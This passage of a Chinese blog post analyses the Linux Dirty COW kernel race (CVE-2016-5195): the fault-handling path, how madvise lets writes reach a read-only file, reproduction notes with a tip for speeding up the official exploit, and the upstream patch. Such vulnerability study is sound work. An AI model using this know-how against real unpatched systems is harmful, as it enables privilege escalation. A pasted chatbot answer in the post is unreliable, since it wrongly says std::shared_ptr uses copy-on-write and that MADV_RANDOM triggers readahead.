&amp; VM_WRITE))</span><br><span class="line">		*flags &amp;= ~FOLL_WRITE;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// 重点来了，如果vma-&gt;vm_flags没有VM_WRITE权限，则将flags中的FOLL_WRITE清除 </span></span><br></pre></td></tr></table></div></figure>
+<p><code>do_cow_fault()</code>函数返回0，回到__get_user_pages()函数中的retry标签处，再次执行<code>follow_page_mask()</code>。但这次，flags中的FOLL_WRITE已经被清除了，相当于一个读请求。于是，正常情况下<code>follow_page_mask()</code>此时就会返回刚刚操作过的匿名映射的页面，后续用户对该页面的写不会同步到磁盘文件中。正常来说这个功能是没什么问题的。</p>
+<p>但是！！如果此时有另一个线程出现，使用 <code>madvise(addr, len, MADV_DONTNEED)</code> 释放目标页面，并清空页表项，后续就会以FOLL_RAED再走一次<code>follow_page_mask()</code> -&gt; <code>faultin_page</code> -&gt; <code>follow_page_mask()</code> -&gt; 返回page cache映射的页面（也就是说写的内容会被同步到磁盘文件中）。回到<code>__access_remote_vm()</code>中，调用<code>kmap()</code>映射返回的页面，由于write标志为1，进入<code>copy_to_user_page()</code>，将需要写入的内容写到只读文件中。</p>
+<p>接下来，我们分析一下目标页面被<code>madvise()</code>释放后的过程</p>
+
+        <h2 id="第三次"   >
+          <a href="#第三次" class="heading-link"><i class="fas fa-link"></i></a><a href="#第三次" class="headerlink" title="第三次"></a>第三次</h2>
+      <blockquote>
+<p>假设第三次进入<code>follow_page_mask()</code>函数前，address对应的物理页被释放且对应的页表项被清空了。而flags中没有POLL_WRITE，会进入读错误的缺页错误处理过程。这个过程不会产生匿名页面，直接将page_cache映射到虚拟内存空间，后续的读写会同步回磁盘文件（这就是漏洞导致的问题所在）。</p>
+</blockquote>
+<p>第三次进入<code>follow_page_mask()</code>函数：</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">follow_page_mask(vma, start, foll_flags, &amp;page_mask);</span><br><span class="line">  pgd_offset(mm, address);</span><br><span class="line">  pud_offset(pgd, address);</span><br><span class="line">  pmd_offset(pud, address);</span><br><span class="line">  follow_page_pte(vma, address, pmd, flags);</span><br><span class="line">  	pte_offset_map_lock(mm, pmd, address, &amp;ptl);</span><br><span class="line">  	pte_present(pte);			<span class="comment">// 第三次进时，由于madivse操作将页表清空了，页不在内存中，且页表项为空，会直接返回NULL</span></span><br><span class="line">  	<span class="keyword">if</span> (!pte_none(pte))</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br></pre></td></tr></table></div></figure>
+<p>返回为NULL，触发<code>faultin_page()</code>处理：</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">faultin_page(tsk, vma, start, &amp;foll_flags, nonblocking);</span><br><span class="line">  handle_mm_fault(mm, vma, address, fault_flags);</span><br><span class="line">    __handle_mm_fault(mm, vma, address, flags);</span><br><span class="line">      pgd_offset(mm, address);</span><br><span class="line">      pud_alloc(mm, pgd, address);</span><br><span class="line">      pmd_alloc(mm, pud, address);</span><br><span class="line">      pte_alloc(mm, pmd, address)</span><br><span class="line">      pte_offset_map(pmd, address);</span><br><span class="line">      handle_pte_fault(mm, vma, address, pte, pmd, flags);</span><br><span class="line">        do_fault(mm, vma, address, pte, pmd, flags, entry);</span><br><span class="line">		  <span class="comment">// 由于flags中的WRITE标记没了，于是会进入do_read_fault()</span></span><br><span class="line">    	  do_read_fault(mm, vma, address, pmd, pgoff, flags, orig_pte);</span><br><span class="line">  		  <span class="comment">// do_read_fault将文件内容读取到vmf-&gt;page页面（page cache），并为此物理页面建立与缺页地址的映射关系。返回0</span></span><br></pre></td></tr></table></div></figure>
+
+
+
+        <h2 id="第四次"   >
+          <a href="#第四次" class="heading-link"><i class="fas fa-link"></i></a><a href="#第四次" class="headerlink" title="第四次"></a>第四次</h2>
+      <blockquote>
+<p><code>follow_page_mask()</code>返回获取到的物理页面给上层函数，不会再进入缺页处理函数。</p>
+</blockquote>
+<p>回到<code>__get_user_pages()</code>函数中的retry标签处，再次执行<code>follow_page_mask()</code>，这次就能获得page_cache对应的页面，对其写是会直接同步到文件中的。</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">follow_page_mask(vma, start, foll_flags, &amp;page_mask);</span><br><span class="line">  pgd_offset(mm, address);</span><br><span class="line">  pud_offset(pgd, address);</span><br><span class="line">  pmd_offset(pud, address);</span><br><span class="line">  follow_page_pte(vma, address, pmd, flags);</span><br><span class="line">  	pte_offset_map_lock(mm, pmd, address, &amp;ptl);</span><br><span class="line">  	pte_present(pte);			<span class="comment">// 第四次进时，由于页在内存中，于是获取页面并返回</span></span><br><span class="line">  	page = vm_normal_page(vma, address, pte);</span><br></pre></td></tr></table></div></figure>
+
+
+
+        <h2 id="最终"   >
+          <a href="#最终" class="heading-link"><i class="fas fa-link"></i></a><a href="#最终" class="headerlink" title="最终"></a>最终</h2>
+      <p>紧接着，返回到<code>__access_remote_vm()</code>函数中，通过<code>kmap()</code>映射绕过mmap映射的读写限制，完成强制写内存。（不幸的是，由于条件竞争漏洞的存在，这个内存写会被同步到磁盘文件中）</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ret = get_user_pages_remote(tsk, mm, addr, <span class="number">1</span>, write, <span class="number">1</span>, &amp;page, &amp;vma);		<span class="comment">// 获取虚拟地址addr对应的物理页面page</span></span><br><span class="line"><span class="keyword">if</span> (ret &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">	maddr = kmap(page);		<span class="comment">// 用于相对短时间的映射，只能映射单个page。</span></span><br><span class="line">	<span class="keyword">if</span> (write) &#123;</span><br><span class="line">		copy_to_user_page(vma, page, addr, maddr + offset, buf, bytes);		<span class="comment">// 将buf内容（用户态传入的数据）写入page cache</span></span><br><span class="line">		set_page_dirty_lock(page);		<span class="comment">// 因为是写，所以将page设置为脏（dirty bit），表示需要写回到文件</span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		copy_from_user_page(vma, page, addr,</span><br><span class="line">				    buf, maddr + offset, bytes);</span><br><span class="line">	&#125;</span><br><span class="line">          kunmap(page);</span><br><span class="line">	put_page(page);</span><br><span class="line">          <span class="comment">// ...</span></span><br></pre></td></tr></table></div></figure>
+<p>后续同步时，就会将page cache修改过的内容写回到磁盘文件中去。（？具体的写回时机是？）</p>
+
+        <h2 id="总结"   >
+          <a href="#总结" class="heading-link"><i class="fas fa-link"></i></a><a href="#总结" class="headerlink" title="总结"></a>总结</h2>
+      <p>精简一下流程，方便回头来看的时候快速理解。</p>
+<p>正常调用流程：</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">follow_page_mask()		<span class="comment">// 页未映射，返回NULL</span></span><br><span class="line">	⬇</span><br><span class="line">faultin_page()			<span class="comment">// 将文件内容读到page cache，并cow一个匿名页面（RO）</span></span><br><span class="line">	⬇</span><br><span class="line">follow_page_mask()		<span class="comment">// 由于访问属性flags中有FOLL_WRITE，而匿名页面只读。权限不匹配，返回NULL</span></span><br><span class="line">	⬇</span><br><span class="line">faultin_page()			<span class="comment">// 一顿处理，知道是匿名页面，所以删除了flags中有FOLL_WRITE</span></span><br><span class="line">	⬇		</span><br><span class="line">follow_page_mask()		<span class="comment">// 没了FOLL_WRITE后，权限检查通过，成功获取到匿名页面page</span></span><br><span class="line">	⬇</span><br><span class="line">返回上一级函数				<span class="comment">// 上一级函数对这个匿名页面通过kmap做写操作，不会影响到磁盘文件</span></span><br></pre></td></tr></table></div></figure>
+<p>dirtycow调用流程：</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">follow_page_mask()		<span class="comment">// 页未映射，返回NULL</span></span><br><span class="line">	⬇</span><br><span class="line">faultin_page()			<span class="comment">// 将文件内容读到page cache，并cow一个匿名页面（RO）</span></span><br><span class="line">	⬇</span><br><span class="line">follow_page_mask()		<span class="comment">// 由于访问属性flags中有FOLL_WRITE，而匿名页面只读。权限不匹配，返回NULL</span></span><br><span class="line">	⬇</span><br><span class="line">faultin_page()			<span class="comment">// 一顿处理，知道是匿名页面，所以删除了flags中有FOLL_WRITE</span></span><br><span class="line">	⬇		<span class="comment">// ***假设另一个线程在这里释放了匿名页面，并清空了页表项</span></span><br><span class="line">follow_page_mask()		<span class="comment">// 页为映射，返回NULL （注意，此时flags中没有了FOLL_WRITE，编程了一个读请求）</span></span><br><span class="line">	⬇</span><br><span class="line">faultin_page()			<span class="comment">// 针对读请求，直接将page cache跟请求的虚拟地址做映射</span></span><br><span class="line">	⬇</span><br><span class="line">follow_page_mask()		<span class="comment">// 成功返回page cache</span></span><br><span class="line">	⬇</span><br><span class="line">返回上一级函数				<span class="comment">// 上一级函数对page cache通过kmap做写操作，会改写磁盘文件内容</span></span><br></pre></td></tr></table></div></figure>
+
+
+
+        <h1 id="复现环境"   >
+          <a href="#复现环境" class="heading-link"><i class="fas fa-link"></i></a><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h1>
+      <p>在<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://cdn.kernel.org/pub/linux/kernel/v4.x/linux-4.6.tar.gz" >linux4.6</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>编译的内核下复现成功，一个原本只读的文件被普通用户修改成功。</p>
+<ul>
+<li>写入字符串的长度如果大于文件大小，最多只能写入文件大小个字符</li>
+<li>官方exp中for循环设置了100000000次，很慢。测试了一下，我的环境里改成100000也能打成，会快很多。</li>
+</ul>
+<p><img   src="image-20230425175820639.png?size=600" style="width: 600px;"  alt="image-20230425175820639"></p>
+
+        <h1 id="漏洞修复"   >
+          <a href="#漏洞修复" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1>
+      <p>patch：<a target="_blank" rel="noopener" href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619"><strong>mm: remove gup_flags FOLL_WRITE games from __get_user_pages()</strong></a></p>
+<figure class="highlight diff"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/include/linux/mm.h b/include/linux/mm.h</span></span><br><span class="line"><span class="comment">index e9caec6a51e97..ed85879f47f5f 100644</span></span><br><span class="line"><span class="comment">--- a/include/linux/mm.h</span></span><br><span class="line"><span class="comment">+++ b/include/linux/mm.h</span></span><br><span class="line"><span class="meta">@@ -2232,6 +2232,7 @@</span> static inline struct page *follow_page(struct vm_area_struct *vma,</span><br><span class="line"> #define FOLL_TRIED	0x800	/* a retry, previous pass started an IO */</span><br><span class="line"> #define FOLL_MLOCK	0x1000	/* lock present pages */</span><br><span class="line"> #define FOLL_REMOTE	0x2000	/* we are working on non-current tsk/mm */</span><br><span class="line"><span class="addition">+#define FOLL_COW	0x4000	/* internal GUP flag */</span></span><br><span class="line"> </span><br><span class="line"> typedef int (*pte_fn_t)(pte_t *pte, pgtable_t token, unsigned long addr,</span><br><span class="line"> 			void *data);</span><br><span class="line"><span class="comment">diff --git a/mm/gup.c b/mm/gup.c</span></span><br><span class="line"><span class="comment">index 96b2b2fd0fbd1..22cc22e7432f6 100644</span></span><br><span class="line"><span class="comment">--- a/mm/gup.c</span></span><br><span class="line"><span class="comment">+++ b/mm/gup.c</span></span><br><span class="line"><span class="meta">@@ -60,6 +60,16 @@</span> static int follow_pfn_pte(struct vm_area_struct *vma, unsigned long address,</span><br><span class="line"> 	return -EEXIST;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+/*</span></span><br><span class="line"><span class="addition">+ * FOLL_FORCE can write to even unwritable pte&#x27;s, but only</span></span><br><span class="line"><span class="addition">+ * after we&#x27;ve gone through a COW cycle and they are dirty.</span></span><br><span class="line"><span class="addition">+ */</span></span><br><span class="line"><span class="addition">+static inline bool can_follow_write_pte(pte_t pte, unsigned int flags)</span></span><br><span class="line"><span class="addition">+&#123;</span></span><br><span class="line"><span class="addition">+	return pte_write(pte) ||</span></span><br><span class="line"><span class="addition">+		((flags &amp; FOLL_FORCE) &amp;&amp; (flags &amp; FOLL_COW) &amp;&amp; pte_dirty(pte));</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> static struct page *follow_page_pte(struct vm_area_struct *vma,</span><br><span class="line"> 		unsigned long address, pmd_t *pmd, unsigned int flags)</span><br><span class="line"> &#123;</span><br><span class="line"><span class="meta">@@ -95,7 +105,7 @@</span> retry:</span><br><span class="line"> 	&#125;</span><br><span class="line"> 	if ((flags &amp; FOLL_NUMA) &amp;&amp; pte_protnone(pte))</span><br><span class="line"> 		goto no_page;</span><br><span class="line"><span class="deletion">-	if ((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte)) &#123;</span></span><br><span class="line"><span class="addition">+	if ((flags &amp; FOLL_WRITE) &amp;&amp; !can_follow_write_pte(pte, flags)) &#123;</span></span><br><span class="line"> 		pte_unmap_unlock(ptep, ptl);</span><br><span class="line"> 		return NULL;</span><br><span class="line"> 	&#125;</span><br><span class="line"><span class="meta">@@ -412,7 +422,7 @@</span> static int faultin_page(struct task_struct *tsk, struct vm_area_struct *vma,</span><br><span class="line"> 	 * reCOWed by userspace write).</span><br><span class="line"> 	 */</span><br><span class="line"> 	if ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))</span><br><span class="line"><span class="deletion">-		*flags &amp;= ~FOLL_WRITE;</span></span><br><span class="line"><span class="addition">+	        *flags |= FOLL_COW;</span></span><br><span class="line"> 	return 0;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></div></figure>
+<p>patch中，增加了一个<code>FOLL_COW</code>的属性和一些检查。当第二次因为 “页表权限和访问权限不匹配” 进入<code>faultin_page()</code>处理时，不再清除<code>FOLL_WRITE</code>属性，而是给flags加上一个<code>FOLL_COW</code>的属性。这样第三次进入<code>follow_page_mask()</code>时仍然带着<code>FOLL_WRITE</code>，避免了条件竞争引起的写page cache。</p>
+
+        <h1 id="参考资料"   >
+          <a href="#参考资料" class="heading-link"><i class="fas fa-link"></i></a><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1>
+      <ul>
+<li><p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://atum.li/2016/10/25/dirtycow/" >CVE-2016-5195 DirtyCow:Linux内核提权漏洞分析</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</li>
+<li><p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/579444153" >pin memory与get_user_pages()函数</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</li>
+<li><p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_38537730/article/details/104252794" >页表管理-linux页目录项获取相关函数分析</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>：实际上64位linux中还有个PUD，多了一层</p>
+</li>
+</ul>
+
+        <h1 id="知识点"   >
+          <a href="#知识点" class="heading-link"><i class="fas fa-link"></i></a><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1>
+      
+        <h2 id="copy-on-write机制"   >
+          <a href="#copy-on-write机制" class="heading-link"><i class="fas fa-link"></i></a><a href="#copy-on-write机制" class="headerlink" title="copy-on-write机制"></a>copy-on-write机制</h2>
+      <p>先看一下wiki上对<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Copy-on-write" >Copy-on-write</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>的解释：</p>
+<p>Copy-on-write(COW)是计算机编程中一种资源管理技术，它提高了“可更改资源”的复制效率。如果一个资源需要被复制，但暂时不会被更改，那么就没必要创建一个新的资源，而是让“复制品”和”原件”共享同一个资源。但如果后续对该资源的使用过程中，需要对其进行更改（如写操作）时，就必须创建一个新资源（复制一份）。也就是copy-on-write（写时拷贝）名字的意义，在进行写操作时才真正执行复制的操作。</p>
+<p>在虚拟内存管理中，copy-on-write在fork系统调用的实现中有所体现，用于父子进程间虚拟内存的共享。通常，创建一个新进程时，父子进程的内存空间有大量相同的内容，如果为子进程创建一个跟父进程同样大小的内存空间，是非常浪费的行为，这时copy-on-write机制就能很好地发挥作用。</p>
+<p>copy-on-write机制的实现可以很简单，在页表上标记某个内存页面为只读，并记录当前物理页面的引用数（在struct page中）。当内核监控到有对这个页面写的请求时，就新申请一个物理页面，将原数据拷贝过来（对于引用计数为1的情况，无需申请新页面）。更新页表指向新申请的物理页面，对原物理页面的引用计数减1，然后执行写操作。</p>
+<p>另外，在内存分配中也可以使用copy-on-write机制。在系统中保留一个内容全为0的物理页面，当进程申请内存时，把这个物理页面映射给进程，并将其标记为copy-on-write。这样，只有当进程有写操作时，才需要为其分配物理内存，让进程拥有的虚拟内存空间大于实际的物理内存空间。</p>
+<p>关于它的应用场景，我问了一下chatgpt，觉得它回答得挺好的，直接贴上来了。（感觉以后写博客都可以交给它了hhhh）</p>
+<p>Copy-On-Write（COW）机制在操作系统和编程语言中有多种应用场景。以下是一些常见的应用场景和方法：</p>
+<ol>
+<li>进程复制：在Linux中，当一个进程使用fork()系统调用创建一个子进程时，子进程会共享父进程的地址空间。使用COW机制可以避免不必要的内存复制，从而提高进程创建的效率和性能。</li>
+<li>文件系统：在文件系统中，COW技术可以用于实现写时复制（Copy-On-Write）的快照。在写时复制快照中，当文件被修改时，仅会复制发生变化的数据块，而不是整个文件。这可以节省存储空间，并提高快照的创建和恢复速度。</li>
+<li>内存分配：在编程语言中，COW机制可以用于实现共享内存。例如，在C++中，std::shared_ptr类使用COW技术来实现多个指针共享同一个对象的内存。当一个指针尝试修改共享内存时，COW机制会创建一个新的拷贝，以避免对其他指针的影响。</li>
+<li>数据库：在数据库中，COW技术可以用于实现多版本并发控制（MVCC）。在MVCC中，每个事务可以看到数据库的一个快照。当事务修改数据时，COW机制会创建一个新的版本，以避免对其他事务的影响。</li>
+</ol>
+<p>这些只是COW机制的一些常见应用场景和方法，它还可以用于其他许多领域，例如虚拟内存、网络协议栈等。</p>
+
+        <h2 id="mmap"   >
+          <a href="#mmap" class="heading-link"><i class="fas fa-link"></i></a><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h2>
+      <p>mmap是一个非常常用的系统调用（在libc中封装成了mmap函数），它可以将文件或设备映射到进程的虚拟内存空间。当我们需要对文件或设备进行读写操作时，通常需要将它们读取到内存中，然后进行操作，最后再写回到文件或设备中。这个过程需要使用大量的系统调用和数据传输，非常繁琐和耗时。而将文件或设备映射到进程的虚拟地址空间中，可以将文件或设备的数据直接映射到进程的内存中，这样就可以直接在内存中进行读写操作，大大提高了读写效率。</p>
+<p>mmap系统调用被封装成了一个libc的函数，函数定义如下：</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mmap</span><span class="params">(<span class="keyword">void</span> *addr, <span class="keyword">size_t</span> length, <span class="keyword">int</span> prot, <span class="keyword">int</span> flags, <span class="keyword">int</span> fd, <span class="keyword">off_t</span> offset)</span></span>;</span><br></pre></td></tr></table></div></figure>
+<ul>
+<li>void *addr：指定映射区域在进程中的起始地址，通常传入NULL，让内核自动分配。</li>
+<li>size_t length：指定映射区域的大小。</li>
+<li>int prot：指定映射区域的访问权限，常用的有可读<code>PROT_READ</code>、可写<code>PROT_WRITE</code>、可执行<code>PROT_EXEC</code>等。</li>
+<li>int flags：指定映射区域的映射方式，比如私有映射<code>MAP_PRIVATE</code>、共享映射<code>MAP_SHARED</code>、匿名映射<code>MAP_ANONYMOUS</code>、固定映射<code>MAP_FIXED</code>等。</li>
+<li>int fd：指定需要映射的文件描述符，如果指定映射方式是匿名映射，则为-1。</li>
+<li>off_t offset：指定从文件或设备的哪个位置开始映射数据。</li>
+</ul>
+<p>mmap函数返回一个指向映射区域的指针，如果映射失败，则返回MAP_FAILED。</p>
+<p>该漏洞利用重点需要关注映射方式MAP_PRIVATE。</p>
+<blockquote>
+<p>MAP_PRIVATE：私有映射。将文件或设备映射到进程的虚拟地址空间中，并创建一个进程私有的映射区域。这样，进程可以在这个映射区域中进行读写操作，而不会影响原始文件或设备。当进程对映射区域进行修改时，内核会将这些修改写入到一个新的私有页面中，而不会影响原始文件或设备。这个标志必须与PROT_READ结合使用。</p>
+</blockquote>
+<p>简单来说，MAP_PRIVATE标志会建立一个写入时拷贝（copy-on-write）的私有映射，内存区域的写入不会影响到原文件。</p>
+<p>尝试用不同的open属性和mmap属性来操作测试文件，得到如下结果：</p>
+<div class="table-container"><table>
+<thead>
+<tr>
+<th>open</th>
+<th>mmap</th>
+<th>result</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>O_RDWR</td>
+<td>PROT_READ|PROT_WRITE,MAP_PRIVATE</td>
+<td>写操作不会报错，但内容无法同步到磁盘文件</td>
+</tr>
+<tr>
+<td>O_RDWR</td>
+<td>PROT_READ|PROT_WRITE,MAP_SHARED</td>
+<td>写的内容将同步到磁盘文件中</td>
+</tr>
+<tr>
+<td>O_RDWR</td>
+<td>PROT_READ，MAP_PRIVATE</td>
+<td>尝试往映射区写入时程序崩溃</td>
+</tr>
+<tr>
+<td>O_RDWR</td>
+<td>PROT_READ，MAP_SHARED</td>
+<td>尝试往映射区写入时程序崩溃</td>
+</tr>
+<tr>
+<td>O_RDONLY</td>
+<td>PROT_READ|PROT_WRITE,MAP_PRIVATE</td>
+<td>可以映射成功，但写的内容不会同步到磁盘文件</td>
+</tr>
+<tr>
+<td>O_RDONLY</td>
+<td>PROT_READ|PROT_WRITE,MAP_SHARED</td>
+<td>无法映射成功，mmap报错Permission denied</td>
+</tr>
+</tbody></table></div>
+
+        <h2 id="madvise"   >
+          <a href="#madvise" class="heading-link"><i class="fas fa-link"></i></a><a href="#madvise" class="headerlink" title="madvise"></a>madvise</h2>
+      <p>madvise（memory advise）是一个系统调用，可以用于向内核提供关于进程虚拟地址空间的一些提示，以帮助内核优化内存使用和性能。</p>
+<p>madvise被封装成libc函数，其原型如下：</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">madvise</span><span class="params">(<span class="keyword">void</span> *addr, <span class="keyword">size_t</span> length, <span class="keyword">int</span> advice)</span></span>;</span><br></pre></td></tr></table></div></figure>
+<p>其中，addr是进程虚拟地址空间的起始地址，length是需要提供提示的内存区域的大小，advice是提示类型，常见的提示类型有以下几种：</p>
+<ul>
+<li>MADV_NORMAL：默认行为，不提供任何提示。</li>
+<li>MADV_RANDOM：该区域将被随机访问，建议内核预读取相邻的页。</li>
+<li>MADV_SEQUENTIAL：该区域将被顺序访问，建议内核预读取整个区域。</li>
+<li>MADV_WILLNEED：该区域将被访问，建议内核预读取整个区域。</li>
+<li>MADV_DONTNEED：该区域不再需要，建议内核释放相应的物理内存（页表项将被置空）。</li>
+</ul>
+
+        <h2 id="proc-self-mem文件"   >
+          <a href="#proc-self-mem文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#proc-self-mem文件" class="headerlink" title="/proc/self/mem文件"></a>/proc/self/mem文件</h2>
+      <p><code>/proc/&lt;pid&gt;/</code>目录下有许多特殊的文件，如<code>/proc/self/maps</code>可以看到查看进程虚拟地址空间映射的情况，<code>/proc/self/mem</code>对应当前进程的虚拟地址空间（可以直接对虚拟地址空间进行读写）。</p>
+<p>如下所示代码片段，最终value的输出结果是”999”。</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> value = <span class="number">123</span>;</span><br><span class="line">    <span class="keyword">int</span> evil = <span class="number">999</span>;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (lseek(fd, (<span class="keyword">off_t</span>)&amp;value, SEEK_SET) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;lseek&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (write(fd, &amp;evil, <span class="keyword">sizeof</span>(evil)) != <span class="keyword">sizeof</span>(evil)) &#123;</span><br><span class="line">        perror(<span class="string">&quot;write&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	close(fd);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;value = %d\n&quot;</span>, value);</span><br><span class="line">    <span 